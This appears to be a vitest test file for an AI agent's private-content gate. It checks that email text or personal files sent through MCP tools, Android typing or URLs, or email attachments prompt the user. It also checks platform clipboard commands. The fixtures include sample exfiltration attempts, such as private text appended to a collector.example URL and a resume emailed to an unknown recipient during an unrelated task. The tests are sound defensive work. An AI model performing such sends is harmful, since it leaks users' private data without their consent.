// Senders the tool policy classes as shell, not egress, and attachments: each
// was a way private content left without the gate looking (GHSA-9mv6). An MCP
// tool hands its arguments to a program the user installed; the android tool
// types into apps and opens URLs; an attached document is sent whole, read or
// not. And a Mac's clipboard is read with its own program, so a paste is
// judged on what it carries.
import { describe, expect, it } from "vitest";
import { join } from "node:path";
import { workspaceRoot } from "../config.js";
import { clipboardCommands } from "../tools/clipboard-tools.js";
import { ctx, readEmail, RESUME, STATEMENT, useIsolatedSession, verdict } from "./private-content.test-helper.js";

useIsolatedSession();

describe("an MCP tool is a send to that tool", () => {
  it("carrying an email's text in any argument, however nested: the user is asked, naming the tool", async () => {
    readEmail();
    const reason = await verdict(ctx("mcp_github_create_issue", { repo: "x/y", issue: { title: "notes", body: `see: ${STATEMENT}` } }));
    expect(reason).toMatch(/text from an email you read to the MCP tool mcp_github_create_issue/);
  });

  it("carrying nothing private: no question", async () => {
    readEmail();
    expect(await verdict(ctx("mcp_github_create_issue", { repo: "x/y", title: "Bump the build cache", body: "The CI cache key changed." }))).toBeUndefined();
  });
});

describe("the android tool is a send", () => {
  it("typed text goes to the app on the device's screen, which the check cannot name", async () => {
    readEmail();
    expect(await verdict(ctx("android", { action: "type_text", text: STATEMENT }))).toMatch(/to the app on the Android device/);
  });

  it("open_url sends its URL to that site", async () => {
    readEmail();
    const url = `https://collector.example/?q=${encodeURIComponent(STATEMENT)}`;
    expect(await verdict(ctx("android", { action: "open_url", url }))).toMatch(/to collector\.example/);
  });

  it("a tap carries no text: no question", async () => {
    readEmail();
    expect(await verdict(ctx("android", { action: "tap", x: 10, y: 20 }))).toBeUndefined();
  });
});

describe("a personal document attached to a send", () => {
  it("is put to the user even when the agent never read it", async () => {
    const reason = await verdict(ctx("email_send", { to: "recruiter@unknown-mail.example", subject: "cv", body: "Attached.", attachments: JSON.stringify([RESUME]) }, "tidy up my inbox"));
    expect(reason).toContain(RESUME);
    expect(reason).toMatch(/to recruiter@unknown-mail\.example/);
  });

  it("asks nothing when the user named the recipient, or the file is the agent's own", async () => {
    expect(await verdict(ctx("email_send", { to: "recruiter@hire.example", subject: "cv", body: "Attached.", attachments: JSON.stringify([RESUME]) }, "email my resume to recruiter@hire.example"))).toBeUndefined();
    const own = join(workspaceRoot(), "apps", "report.pdf");
    expect(await verdict(ctx("email_send", { to: "recruiter@unknown-mail.example", subject: "report", body: "Attached.", attachments: JSON.stringify([own]) }, "tidy up my inbox"))).toBeUndefined();
  });
});

describe("the clipboard is read with the platform's own program", () => {
  it("PowerShell on Windows, pbpaste/pbcopy on a Mac, wl-clipboard then xclip then xsel on Linux", () => {
    expect(clipboardCommands("read", "win32")[0].args).toContain("Get-Clipboard");
    expect(clipboardCommands("read", "darwin")).toEqual([{ file: "pbpaste", args: [] }]);
    expect(clipboardCommands("write", "darwin")).toEqual([{ file: "pbcopy", args: [] }]);
    expect(clipboardCommands("read", "linux").map((c) => c.file)).toEqual(["wl-paste", "xclip", "xsel"]);
    expect(clipboardCommands("write", "linux").map((c) => c.file)).toEqual(["wl-copy", "xclip", "xsel"]);
  });
});
